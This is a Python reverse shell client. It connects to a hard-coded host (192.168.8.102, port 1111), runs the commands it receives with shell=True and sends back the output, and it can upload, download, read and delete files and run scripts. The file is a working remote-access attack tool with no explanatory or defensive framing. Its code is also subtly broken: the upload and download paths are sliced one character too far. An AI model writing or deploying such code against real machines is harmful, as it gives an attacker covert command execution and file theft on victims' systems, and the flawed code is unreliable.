#!/usr/bin/env python3

import socket
import subprocess
import os
import sys
import shutil

server_address = '192.168.8.102'
server_port = 1111

def execute_command(command):
    try:
        result = subprocess.run(command, capture_output=True, shell=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        return f"Error: {e}".encode()

def upload_file(conn, file_path):
    with open(file_path, 'rb') as file:
        conn.send(file.read())

def download_file(conn, file_path):
    with open(file_path, 'wb') as file:
        while True:
            data = conn.recv(1024)
            if not data:
                break
            file.write(data)

def main():
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect((server_address, server_port))

    while True:
        conn.send(b'$ ')
        command = conn.recv(1024).decode().strip()

        if command.lower() == 'quit':
            break
        elif command.lower() == 'clear':
            os.system('clear')
            continue
        elif command.startswith('cd '):
            try:
                os.chdir(command[3:])
            except FileNotFoundError:
                conn.send(b"Error: Directory not found\n")
            continue
        elif command.startswith('set '):
            try:
                name, value = command[4:].split('=', 1)
                os.environ[name] = value
            except ValueError:
                conn.send(b"Error: Invalid environment variable format\n")
            continue
        elif command.startswith('upload '):
            file_path = command[8:]
            upload_file(conn, file_path)
            continue
        elif command.startswith('download '):
            file_path = command[10:]
            download_file(conn, file_path)
            continue
        elif command.startswith('rm '):
            file_path = command[3:]
            try:
                os.remove(file_path)
            except FileNotFoundError:
                conn.send(b"Error: File not found\n")
            continue
        elif command.startswith('mkdir '):
            dir_path = command[6:]
            os.makedirs(dir_path, exist_ok=True)
            continue
        elif command.startswith('cat '):
            file_path = command[4:]
            try:
                with open(file_path, 'rb') as file:
                    conn.send(file.read())
            except FileNotFoundError:
                conn.send(b"Error: File not found\n")
            continue
        elif command.startswith('python '):
            script_path = command[7:]
            try:
                with open(script_path, 'r') as file:
                    script_content = file.read()
                result = execute_command(f"python -c '{script_content}'")
                conn.send(result)
            except FileNotFoundError:
                conn.send(b"Error: File not found\n")
            continue

        result = execute_command(command)
        conn.send(result)

    conn.close()

if __name__ == '__main__':
    main()